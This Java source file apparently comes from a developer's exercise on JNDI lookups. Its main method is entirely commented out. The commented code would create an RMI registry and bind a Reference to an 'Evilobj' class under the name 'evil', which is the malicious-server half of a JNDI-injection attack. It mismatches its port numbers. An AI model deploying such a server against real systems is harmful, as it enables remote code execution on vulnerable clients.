package cn.wangdpwin.test.base.lookup;

//import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @Author wangdongpeng
 * @Date 2021/12/11 11:17 上午
 * @Version 1.0
 */
public class RMIServer {

    public static void main(String[] args) {
        /*try {
            LocateRegistry.createRegistry(12345);
            Registry registry = LocateRegistry.getRegistry();
            System.out.println("create registry on port:1234");
            Reference reference = new Reference("cn.wangdpwin.test.base.lookup.Evilobj",
                    "cn.wangdpwin.test.base.lookup.Evilobj",
                    "cn.wangdpwin.test.base.lookup.Evilobj");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("evil",referenceWrapper);
        } catch (RemoteException e) {
            e.printStackTrace();
        } catch (NamingException e) {
            e.printStackTrace();
        } catch (AlreadyBoundException e) {
            e.printStackTrace();
        }*/
    }
}
